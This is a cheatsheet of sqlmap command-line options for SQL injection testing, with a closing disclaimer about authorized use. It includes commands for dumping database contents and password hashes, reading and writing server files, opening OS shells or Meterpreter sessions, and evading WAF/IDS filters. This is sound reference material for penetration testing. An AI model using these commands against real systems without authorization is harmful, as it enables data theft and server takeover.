# SQLmap Cheatsheet

## Basic Usage
- `sqlmap -u <URL>`: Basic scan of a URL for SQL injection.
- `sqlmap -u <URL> --data="<POST_DATA>"`: Scan a URL with POST data.
- `sqlmap -l <log_file.log>`: Parse targets from a Burp or WebScarab proxy log file.
- `sqlmap -r <request_file.txt>`: Load HTTP request from a file.
- `sqlmap -g "<google_dork>"`: Process Google dork results as target URLs.

## Enumeration
- `sqlmap -u <URL> --dbs`: Enumerate databases.
- `sqlmap -u <URL> -D <database_name> --tables`: Enumerate tables in a specific database.
- `sqlmap -u <URL> -D <database_name> -T <table_name> --columns`: Enumerate columns in a specific table.
- `sqlmap -u <URL> -D <database_name> -T <table_name> -C <column_names> --dump`: Dump data from specific columns.
- `sqlmap -u <URL> --current-user`: Retrieve the current database user.
- `sqlmap -u <URL> --current-db`: Retrieve the current database name.
- `sqlmap -u <URL> --is-dba`: Detect if the current user is a DBA.
- `sqlmap -u <URL> --users`: Enumerate database users.
- `sqlmap -u <URL> --passwords`: Enumerate database user password hashes.
- `sqlmap -u <URL> --roles`: Enumerate database user roles.
- `sqlmap -u <URL> --schema`: Enumerate the entire database schema.

## Optimization and Performance
- `--level=<1-5>`: Level of tests to perform (default: 1). Higher levels include more complex queries.
- `--risk=<1-3>`: Risk of tests to perform (default: 1). Higher risks include potentially harmful queries.
- `-p <parameter>`: Test a specific parameter (e.g., `-p id`).
- `--threads=<number>`: Maximum number of concurrent HTTP(s) requests (default: 1).
- `--dbms=<DBMS>`: Force back-end DBMS to this value (e.g., `MySQL`, `PostgreSQL`).
- `--os=<OS>`: Force back-end DBMS operating system to this value (e.g., `Linux`, `Windows`).
- `--batch`: Never ask for user input, use default behavior.
- `--flush-session`: Flush session files for the current target.

## Injection Techniques
- `--technique=<techniques>`: SQL injection techniques to use (e.g., `BEUSTQ`).
  - `B`: Boolean-based blind
  - `E`: Error-based
  - `U`: Union query-based
  - `S`: Stacked queries
  - `T`: Time-based blind
  - `Q`: Inline queries
- `--union-cols=<range>`: Specify range of columns for UNION query injection (e.g., `10-20`).
- `--union-char=<char>`: Character to use for bruteforcing number of columns (default: `NULL`).

## File System Access
- `sqlmap -u <URL> --file-read="<file_path_on_server>"`: Read a file from the back-end DBMS file system.
- `sqlmap -u <URL> --file-write="<local_file_path>" --file-dest="<remote_file_path_on_server>"`: Write a local file to the back-end DBMS file system.

## Operating System Access (requires advanced privileges)
- `sqlmap -u <URL> --os-shell`: Prompt for an interactive operating system shell.
- `sqlmap -u <URL> --os-cmd="<command>"`: Execute an operating system command.
- `sqlmap -u <URL> --os-pwn`: Prompt for an OOB shell, Meterpreter, or VNC.

## Brute Force
- `sqlmap -u <URL> --common-tables`: Brute force common table names.
- `sqlmap -u <URL> --common-columns`: Brute force common column names.

## Miscellaneous
- `--forms`: Parse and test forms on the target URL.
- `--crawl=<depth>`: Crawl the website starting from the target URL.
- `--cookie="<cookie_string>"`: Set HTTP Cookie header value.
- `--user-agent="<user_agent_string>"`: Set HTTP User-Agent header value.
- `--referer="<referer_string>"`: Set HTTP Referer header value.
- `--headers="<headers_string>"`: Extra headers (e.g., `Accept-Language: fr\nETag: 123`).
- `--proxy="<proxy_address:port>"`: Use an HTTP proxy.
- `--tor`: Use Tor anonymity network.
- `--random-agent`: Use a randomly selected HTTP User-Agent.
- `-v <0-6>`: Verbosity level (0=silent, 1=default, ..., 6=debug).
- `--tamper=<tamper_script>`: Use given tamper script(s) to evade WAF/IDS (e.g., `space2comment`).

**Disclaimer:** Use SQLmap responsibly and only on systems you have explicit permission to test. Unauthorized access or attacks are illegal. 